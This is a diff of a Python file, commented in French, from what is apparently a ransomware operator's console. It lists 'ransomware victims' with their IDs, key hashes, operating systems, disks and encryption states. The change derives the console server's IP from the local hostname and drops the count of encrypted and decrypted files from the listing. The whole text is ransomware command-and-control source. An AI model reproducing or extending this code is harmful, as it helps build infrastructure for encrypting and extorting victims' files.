@@ -3,9 +3,10 @@ from datetime import datetime
 import utile.message
 import utile.network as network
 import utile.security as security
-
+import socket
 # Constantes
-IP_SERV_CONSOLE = '192.168.56.1'
+#IP_SERV_CONSOLE = '192.168.145.222'
+IP_SERV_CONSOLE = socket.gethostbyname(socket.gethostname())
 PORT_SERV_CONSOLE = 8380
 aes_key = b''
 
@@ -41,30 +42,18 @@ def print_victims_listing(client_socket):
 
             texte = "LISTING DES VICTIMES DU RANSOMWARE\n"
             texte += "----------------------------------\n"
-            texte += ("num".ljust(5) + "id".ljust(13) + "type".ljust(13) + "disques".ljust(14) + "statut".ljust(11)
-                      + "nb. de fichiers\n")
 
             # Réception et traitement des données des victimes
             while confirmation_message != 'LIST_VICTIM_END':
                 if msg_type == 'LIST_VICTIM_RESP':
-                    # Mémorisation de l'ID de la victime
-                    liste_id.append(confirmation_message['VICTIM'])
-
-                    # Construction du message selon l'état et le nombre de fichiers
-                    msg_compteur = ''
-                    if confirmation_message['NB_FILES'] == 0:
-                        msg_compteur = '-'
-                    elif confirmation_message['STATE'] in ['PENDING', 'PROTECTED', 'CRYPT']:
-                        msg_compteur = str(confirmation_message['NB_FILES']) + " fichiers chiffrés"
-                    elif confirmation_message['STATE'] == 'DECRYPT':
-                        msg_compteur = str(confirmation_message['NB_FILES']) + " fichiers déchiffrés"
+                    liste_id.append(confirmation_message['VICTIM']) #ID victime
 
                     # Ajout des informations de la victime à l'affichage du listing
                     texte += (str(confirmation_message['VICTIM']).rjust(4, '0') + " " +
                               str(confirmation_message['HASH'])[-12:] + " " +
                               str(confirmation_message['OS']).ljust(13) +
                               str(confirmation_message['DISKS'])[:13].ljust(14) +
-                              str(confirmation_message['STATE']).ljust(11) + str(msg_compteur) + "\n")
+                              str(confirmation_message['STATE']).ljust(11))
 
                     # Réception de la réponse suivante
                     confirmation_message = network.receive_message(client_socket)
